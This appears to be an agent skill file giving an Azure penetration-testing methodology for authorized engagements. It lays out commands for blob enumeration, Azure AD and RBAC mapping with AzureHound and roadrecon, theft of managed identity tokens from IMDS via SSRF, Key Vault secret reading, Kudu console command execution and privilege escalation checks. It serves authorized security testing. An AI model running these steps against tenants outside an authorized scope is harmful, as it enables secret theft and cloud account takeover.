---
name: azure-attack
description: >
  Azure cloud attack surface enumeration and exploitation for authorized
  engagements: blob storage misconfig, managed identity (IMDS) token theft,
  Key Vault secret extraction, App Service abuse, Azure AD / RBAC
  enumeration and privilege escalation. Keywords: Azure, blob storage,
  managed identity, Key Vault, App Service, RBAC, Azure AD, MSI, cloud
  pentest, roadrecon, stormspotter, azurehound. Do NOT use for AWS or GCP
  (see aws-attack / gcp-attack); for on-prem Active Directory even when
  Azure AD Connect hybrid-joins it, use active-directory for the on-prem
  side and this skill only for the cloud-native Azure AD/Entra ID surface.
metadata:
  type: platform
  phase: hunting
  tools: [az-cli, azurehound, roadrecon, stormspotter, microburst, powerzure]
depends_on: [recon-subdomain-enum, cloud-asset-discovery]
feeds_into: [chain-analysis, privesc-report]
chains_with: [active-directory, windows-privesc, kubernetes-attack]
---

## Signals
- `*.blob.core.windows.net`, `*.azurewebsites.net`, `*.vault.azure.net`, `*.database.windows.net` in target scope.
- SSRF on a service hosted in Azure App Service / VM (classic IMDS token theft vector, endpoint `169.254.169.254`).
- Leaked `AZURE_CLIENT_SECRET`, SAS tokens, or connection strings in repos/CI.
- Target org uses Azure AD / Entra ID for SSO (check login redirect to `login.microsoftonline.com`).

## Prerequisites
- Written authorization naming the Azure tenant ID / subscription ID(s) in scope.
- At least a low-privilege Azure AD account, a leaked SAS token, or an SSRF/RCE foothold on an Azure-hosted resource.
- `az-cli`, `AzureHound` + BloodHound, `ROADtools` (roadrecon), `MicroBurst` installed.

## Methodology

### 1. Unauthenticated blob storage recon
```bash
# Guess container names under discovered storage accounts
for c in backup data public assets config; do
  curl -s "https://targetstorage.blob.core.windows.net/$c?restype=container&comp=list" | grep -q "BlobPrefix\|Blob>" && echo "[+] $c listable"
done

# Enumerate storage accounts via MicroBurst
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target
```

### 2. Authenticate and establish identity
```bash
az login --username user@target.com --password '...'
az account show
az ad signed-in-user show
```

### 3. Azure AD / RBAC enumeration
```bash
# BloodHound-style graph for Azure AD
azurehound list --username user@target.com --password '...' --tenant <tenant-id> -o azurehound-output.json
# Load into BloodHound CE (Azure AD edges: AZGlobalAdmin, AZOwns, AZContributor, AZAddMembers...)

roadrecon auth -u user@target.com -p '...'
roadrecon gather
roadrecon gui   # browse RBAC roles, app registrations, service principals
```

### 4. Managed Identity / IMDS token theft (via SSRF/RCE foothold)
```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Pivot the token to management plane
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### 5. Key Vault secret extraction
```bash
az keyvault list
az keyvault secret list --vault-name target-kv
az keyvault secret show --vault-name target-kv --name db-password
# Access policy / RBAC misconfig: check who has get/list on secrets
az keyvault show --name target-kv --query properties.accessPolicies
```

### 6. App Service abuse
```bash
# Kudu / SCM console RCE if exposed and creds known
curl -u 'user:pass' https://target.scm.azurewebsites.net/api/command -d '{"command":"whoami","dir":"site\\wwwroot"}' -H "Content-Type: application/json"
# Deployment credentials / publish profile leak check
az webapp deployment list-publishing-credentials --name target-app --resource-group target-rg
```

### 7. Service principal / app registration abuse
```bash
az ad app list --display-name target
az ad sp list --display-name target
# Check for app with Owner on subscription via a weak client secret
az ad app credential list --id <app-id>
```

### 8. Privilege escalation via RBAC
```bash
# Enumerate roles assigned and look for custom roles with wildcard actions
az role assignment list --all
az role definition list --custom-role-only true
# PowerZure privesc checks
Import-Module PowerZure.psm1
Get-AzureRoles
```

## Tooling
`az-cli`, `AzureHound`+BloodHound CE, `ROADtools` (roadrecon), `Stormspotter`, `MicroBurst`, `PowerZure`, `TruffleHog`/`gitleaks`.

## Validation Gate
- Confirm every IMDS-derived token actually authenticates against `management.azure.com` or Graph before reporting — a token request succeeding is not proof of valid scope.
- Reproduce RBAC privesc by performing the actual escalation action (e.g. `az role assignment create`) in a scoped test, not just citing the role definition.
- For Key Vault/blob findings, record the exact access policy / container ACL that permitted access (screenshot or `az` JSON output with timestamp).

## Gotchas
- Conditional Access policies can block `az login` even for valid creds (MFA required, location-based) — a 401 doesn't always mean invalid credentials.
- Many storage accounts intentionally expose a `$web` container for static website hosting — verify sensitivity before flagging.
- Azure AD Connect hybrid sync means on-prem AD compromise can cascade to Azure AD and vice versa — cross-reference with active-directory findings.
- IMDS on Azure requires the `Metadata: true` header (unlike AWS); SSRF primitives that can't set custom headers won't work here.
- Role assignments inherited from management groups aren't visible with subscription-scoped `az role assignment list` unless `--scope` is set to the management group.
